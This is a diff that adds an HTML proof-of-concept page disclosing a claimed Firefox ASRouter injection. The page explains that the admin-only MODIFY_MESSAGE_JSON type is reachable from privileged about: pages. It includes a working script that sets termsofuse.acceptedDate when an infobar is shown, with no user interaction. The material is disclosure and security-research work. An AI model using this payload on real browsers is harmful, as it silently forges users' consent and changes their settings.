@@ -1,0 +1,68 @@
+<meta charset="utf-8">
+<title>ASRouter MODIFY_MESSAGE_JSON injection — sn0x</title>
+<style>
+:root{color-scheme:dark}
+*{box-sizing:border-box}
+body{background:#0d1117;color:#c9d1d9;font:14px/1.6 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+     margin:0;padding:24px;max-width:1100px;margin-inline:auto}
+h1{font-size:19px;color:#e6edf3;border-bottom:1px solid #30363d;padding-bottom:12px;margin:0 0 18px}
+h2{font-size:15px;color:#e6edf3;margin:26px 0 8px}
+a{color:#58a6ff}
+.ok{color:#3fb950;font-weight:700}
+.bad{color:#f85149;font-weight:700}
+.warn{color:#d29922;font-weight:700}
+.muted{color:#8b949e}
+pre{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;overflow-x:auto;
+    white-space:pre-wrap;word-break:break-word;font-size:12.5px}
+.box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:14px;margin:14px 0}
+.ctx{border-left:3px solid #d29922;background:#1c1a12}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700;
+       border:1px solid #30363d;margin-right:6px}
+button{background:#238636;color:#fff;border:0;border-radius:6px;padding:9px 16px;font:inherit;
+       font-weight:700;cursor:pointer}
+button:disabled{background:#30363d;color:#8b949e;cursor:not-allowed}
+table{border-collapse:collapse;width:100%;margin:10px 0;font-size:13px}
+th,td{border:1px solid #30363d;padding:6px 9px;text-align:left;vertical-align:top}
+th{background:#161b22}
+#status{font-size:16px;font-weight:700;margin:14px 0}
+</style>
+<h1>Firefox ASRouter MODIFY_MESSAGE_JSON injection PoC — sn0x</h1>
+<div class="box ctx"><b>Execution context:</b> script running in a privileged about: page that exposes <code>ASRouterMessage</code> (about:welcome, about:privatebrowsing, about:newtab, about:home, about:asrouter). The button works when this file is loaded in that context via poc.py.</div>
+
+<div class="box"><span class="badge">RUNTIME-CONFIRMED</span>
+<span class="badge">AFFECTS 152.0.6 + 153.0.1</span></div>
+
+<h2>Defect</h2>
+<p><code>ASRouterChild.sys.mjs:33</code> exports <code>ASRouterMessage</code> into page scope via
+<code>Cu.exportFunction</code>. The only filter is <code>VALID_TYPES.has(type)</code>
+(<code>:98</code>) — and <code>ActorConstants.mjs:24</code>'s <code>// Admin types</code> is a
+<b>comment, not a check</b>, so <code>MODIFY_MESSAGE_JSON</code> is reachable from the page.</p>
+<p>Zero-click leg: <code>InfoBar.handleImpressionAction:325</code> fires on <i>impression</i>, and
+<code>allowedSetOnImpressionPrefs</code> permits <code>termsofuse.firstAcceptedDate</code> /
+<code>termsofuse.acceptedDate</code> — forging consent with no user interaction.</p>
+
+<h2>Result</h2>
+<div id="status" class="muted">idle</div>
+<button id="go">Launch PoC</button>
+<pre id="out">—</pre>
+
+<script>
+const out=document.getElementById('out'), st=document.getElementById('status');
+document.getElementById('go').onclick=()=>{
+  st.textContent='SENDING...'; st.className='warn';
+  if(typeof ASRouterMessage!=='function'){
+    st.textContent='FAILED — ASRouterMessage not exported here'; st.className='bad';
+    out.textContent='Load this page in about:welcome / about:privatebrowsing (see poc.py).'; return;
+  }
+  try{
+    ASRouterMessage({type:'MODIFY_MESSAGE_JSON',data:{content:{
+      id:'SNOX_IMPRESSION_ZEROCLICK', template:'infobar', type:'global',
+      text:'sn0x PoC', buttons:[],
+      impression_action:{type:'SET_PREF',data:{pref:{name:'termsofuse.acceptedDate',value:1}}}
+    }}});
+    out.textContent='MODIFY_MESSAGE_JSON accepted by the parent actor (no type rejection).';
+    st.textContent='CALLBACK RECEIVED — check prefs.js for termsofuse.acceptedDate';
+    st.className='ok';
+  }catch(e){ st.textContent='FAILED'; st.className='bad'; out.textContent=String(e); }
+};
+</script>
